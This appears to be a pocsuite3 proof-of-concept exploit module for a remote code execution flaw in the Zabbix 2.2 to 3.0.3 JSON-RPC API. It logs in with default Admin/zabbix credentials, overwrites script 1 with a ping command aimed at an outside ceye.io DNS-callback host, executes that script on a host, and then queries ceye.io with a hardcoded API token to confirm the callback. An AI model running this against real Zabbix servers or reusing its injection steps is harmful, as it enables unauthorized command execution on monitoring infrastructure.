#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase
from collections import OrderedDict
from pocsuite3.api import OptString
import json
from pocsuite3.lib.utils import random_str

class Zabbix(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-06'
    updateDate = '2019-11-06'
    references = ['']
    name = 'Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution'
    appPowerLink = ''
    appName = 'Zabbix'
    appVersion = 'Zabbix 2.2 < 3.0.3'
    vulType = 'rce'
    desc = ''' 
    Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution
    '''

    def _options(self):
        o = OrderedDict()
        o['username'] = OptString('', description='username', require=False)
        o['password'] = OptString('', description='password', require=False)
        o['hostid'] = OptString('', description='hostid', require=False)
        return o

    def _headers(self):
        headers = {
            'content-type': 'application/json',
        }
        return headers

    def _verify(self):
        result = {}
        cmd = random_str(16) + '.6eb4yw.ceye.io'
        try:
            if self.url[-1] == '/':
                url = self.url + 'api_jsonrpc.php'
            else:
                url = self.url + '/api_jsonrpc.php'
            username = self.get_option('username') or 'Admin'
            password = self.get_option('password') or 'zabbix'
            hostid = self.get_option('hostid') or '10084'
            authData = {
                "jsonrpc" : "2.0",
                "method" : "user.login",
                "params": {
                    'user': "" + username + "",
                    'password': "" + password + "",
                },
                "auth" : None,
                "id" : 0,
            }
            response = requests.post(
                url=url,
                data=json.dumps(authData),
                headers=self._headers()
            )
            auth = response.json()
            payload = {
                "jsonrpc": "2.0",
                "method": "script.update",
                "params": {
                    "scriptid": "1",
                    "command": "" + 'ping ' + cmd + ""
                },
                "auth" : auth['result'],
                "id" : 0,
            }
            requests.post(
                url=url,
                data=json.dumps(payload),
                headers=self._headers()
            )
            ec = {
                "jsonrpc": "2.0",
                "method": "script.execute",
                "params": {
                    "scriptid": "1",
                    "hostid": ""+hostid+""
                },
                "auth" : auth['result'],
                "id" : 0,
            }
            requests.post(
                url=url,
                data=json.dumps(ec),
                headers=self._headers()
            )
            res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
            if cmd in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = payload
        except:
            pass
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Not vulnerability')
        return output

register_poc(Zabbix)